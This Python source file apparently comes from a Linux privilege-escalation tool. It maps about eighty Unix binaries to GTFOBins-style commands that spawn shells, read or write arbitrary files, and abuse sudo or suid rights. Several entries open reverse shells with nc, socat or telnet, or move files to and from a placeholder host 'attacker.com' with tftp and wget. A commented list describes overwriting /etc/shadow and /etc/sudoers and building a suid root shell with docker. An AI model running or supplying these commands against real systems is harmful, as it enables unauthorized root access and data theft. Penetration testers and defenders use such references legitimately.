#!/usr/bin/env python
# -*- coding: utf-8 -*-

class Binaries:
    """
    Binaries that allow to execute commands from it.
    If run with higher privilege (suid / cron / ...) could be used to elevate our privilege
    http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html
    https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html#abusing-sudo-rights
    http://touhidshaikh.com/blog/?p=790
    """

    # nc, netcat, strace ?
    def __init__(self):
        """
        List inspired from GTFOBins:
        https://gtfobins.github.io/#
        """
        # self.list = [
        #     ('apache2', '$ apache2 -f /etc/shadow'),  # Read files
        #     ('awk', '$ awk \'BEGIN {system("/bin/sh")}\''),
        #     ('bash', '$ /bin/bash'),
        #     ('cp', 'overwrite /etc/shadow or /etc/sudoers file'),
        #     ('dash', '$ /bin/dash'),
        #     ('docker',
        #      '$ docker run -v /home/${USER}:/h_docs ubuntu bash -c "cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;" && ~/rootshell -p'),
        #     ('ftp', '$ ftp> ! ls'),
        #     ('find', '$ echo "/bin/sh" > /tmp/run.sh\n$ find . -type d -exec /tmp/run.sh {} \\;'),
        #     # or find . -type d -exec sh -c id {} \;
        #     ('git', '$ export PAGER=./runme.sh\n$ git -p help'),
        #     ('less', '!bash'),
        #     ('lua', 'os.execute(\'/bin/sh\')'),
        #     ('man', '!bash '),  # or $ man -P /tmp/runme.sh man
        #     ('more', '!bash'),
        #     ('mount', '$ sudo mount -o bind /bin/bash /bin/mount\n$ sudo mount'),
        #     # could be a false positive => mount: only root can use "--options" option
        #     ('mv', 'overwrite /etc/shadow or /etc/sudoers file'),
        #     ('nmap', '$ echo "os.execute(\'/bin/sh\')" > /tmp/script.nse\n$ nmap --script=/tmp/script.nse'),
        #     ('perl', '$ perl -e \'exec "/bin/sh";\''),
        #     ('python', '$ python -c \'import os;os.system("/bin/sh")\''),
        #     ('rbash', '$ /bin/rbash'),
        #     ('rsync',
        #      '$ echo "whoami > /tmp/whoami" > /tmp/tmpfile\nsudo rsync  -e \'sh /tmp/tmpfile\' /dev/null 127.0.0.1:/dev/null 2>/dev/null\ncat whoami '),
        #     ('ruby', '$ ruby -e \'exec "/bin/sh"\''),
        #     ('sftp', '$ ftp> ! ls'),
        #     ('sh', '$ /bin/sh'),
        #     ('tar', '$ tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh'),
        #     # or tar c a.tar -I ./runme.sh a
        #     ('tcpdump', '$ tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh'),
        #     # or sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
        #     ('vi', '$ vi -c \'!sh\''),  # or :!bash or :set shell=/bin/bash:shell or :shell
        #     ('vim', '$ vim -c \'!sh\''),  # or :!bash or :set shell=/bin/bash:shell or :shell
        #     ('wget', '$ sudo wget http://127.0.0.1/sudoers -O /etc/sudoers'),
        #     # Overwrite system file (need a web server)
        #     ('zip', '$ zip z.zip * -T -TT /tmp/run.sh'),
        # ]

        self.binaries = {
            "ash": "ash",
            "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
            "base64": "LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode\n",
            "bash": "bash",
            "busybox": "busybox sh",
            "cat": "LFILE=file_to_read\ncat \"$LFILE\"\n",
            "crontab": "crontab -e",
            "csh": "csh",
            "curl": "LFILE=/tmp/file_to_read\ncurl file://$LFILE\n",
            "cut": "LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\"\n",
            "dash": "dash",
            "dd": "LFILE=file_to_write\necho \"data\" | dd of=$LFILE\n",
            "diff": "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\n",
            "ed": "ed\n!/bin/sh\n",
            "emacs": "emacs -Q -nw --eval '(term \"/bin/sh\")'",
            "env": "env /bin/sh",
            "expand": "LFILE=file_to_read\nexpand \"$LFILE\"\n",
            "expect": "expect -c 'spawn /bin/sh;interact'",
            "find": "find . -exec /bin/sh \\; -quit",
            "flock": "flock -u / /bin/sh",
            "fmt": "LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\"\n",
            "fold": "LFILE=file_to_read\nfold -w99999999 \"$LFILE\"\n",
            "ftp": "ftp\n!/bin/sh\n",
            "gdb": "gdb -nx -ex '!sh' -ex quit",
            "git": "export PAGER=/usr/bin/id\ngit -p help\n",
            "head": "LFILE=file_to_read\nhead -c1G \"$LFILE\"\n",
            "ionice": "ionice /bin/sh",
            "jq": "LFILE=file_to_read\njq -Rr . \"$LFILE\"\n",
            "ksh": "ksh",
            "ld.so": "/lib/ld.so /bin/sh",
            "less": "less /etc/profile\n!/bin/sh\n",
            "ltrace": "ltrace -b -L /bin/sh",
            "lua": "lua -e 'os.execute(\"/bin/sh\")'",
            "mail": "TF=$(mktemp)\necho \"From nobody@localhost $(date)\" > $TF\nmail -f $TF\n!/bin/sh\n",
            "make": "COMMAND='/bin/sh'\nmake -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n",
            "man": "man man\n!/bin/sh\n",
            "more": "TERM= more /etc/profile\n!/bin/sh\n",
            "mount": "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n",
            "nano": "COMMAND=id\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nnano -s $TF /etc/hosts\n^T\n",
            "nc": "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n",
            "nl": "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE\n",
            "node": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]});'\n",
            "od": "LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\"\n",
            "perl": "perl -e 'exec \"/bin/sh\";'",
            "php": "export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'\n",
            "pico": "COMMAND=id\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\npico -s $TF /etc/hosts\n^T\n",
            "puppet": "export CMD=\"/usr/bin/id\"\npuppet apply -e \"exec { '$CMD': logoutput => true }\"\n",
            "python2": "python2 -c 'import os; os.system(\"/bin/sh\")'",
            "python3": "python3 -c 'import os; os.system(\"/bin/sh\")'",
            "rlwrap": "rlwrap /bin/sh",
            "rpm": "rpm --eval '%{lua:posix.exec(\"/bin/sh\")}'",
            "rpmquery": "rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'",
            "ruby": "ruby -e 'exec \"/bin/sh\"'",
            "scp": "TF=$(mktemp)\nCMD=\"id\"\necho \"$CMD\" > \"$TF\"\nchmod +x \"$TF\"\nscp -S $TF x y:\n",
            "sed": "sed -n \"1e bash -c 'exec 10<&0 11>&1 0<&2 1>&2; /bin/sh -i'\" /etc/hosts",
            "setarch": "setarch $(arch) /bin/sh",
            "sftp": "HOST=user@attacker.com\nsftp $HOST\n!/bin/sh\n",
            "shuf": "LFILE=file_to_write\nshuf -e data -o \"$LFILE\"\n",
            "socat": "RHOST=attacker.com\nRPORT=12345\nsudo -E socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane\n",
            "sort": "LFILE=file_to_read\nsort -m \"$LFILE\"\n",
            "sqlite3": "sqlite3 /dev/null '.shell /bin/sh'",
            "ssh": "ssh localhost $SHELL --noprofile --norc",
            "stdbuf": "stdbuf -i0 /bin/sh",
            "strace": "strace -o /dev/null /bin/sh",
            "tail": "LFILE=file_to_read\ntail -c1G \"$LFILE\"\n",
            "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "taskset": "taskset 1 /bin/sh",
            "tclsh": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
            "tee": "LFILE=file_to_write\necho data | ./tee -a \"$LFILE\"\n",
            "telnet": "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh\n",
            "tftp": "RHOST=attacker.com\nsudo -E tftp $RHOST\nput file_to_send\n",
            "time": "/usr/bin/time /bin/sh",
            "timeout": "timeout 7d /bin/sh",
            "ul": "LFILE=file_to_read\nul \"$LFILE\"\n",
            "unexpand": "LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\"\n",
            "uniq": "LFILE=file_to_read\nuniq \"$LFILE\"\n",
            "unshare": "unshare /bin/sh",
            "vi": "vi -c ':!/bin/sh'",
            "watch": "watch /usr/bin/id",
            "wget": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nsudo -E wget $URL -O $LFILE\n",
            "whois": {},
            "wish": "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n",
            "xargs": "xargs -a /dev/null /usr/bin/id",
            "xxd": "LFILE=file_to_write\necho data | xxd | xxd -r - \"$LFILE\"\n",
            "zsh": "zsh"
        }

    def find_binary(self, binary):
        """
        Found the associated command line to execute system code using the binary
        """
        for b in self.binaries:
            if b == binary.lower():
                return self.binaries[b]
        return False
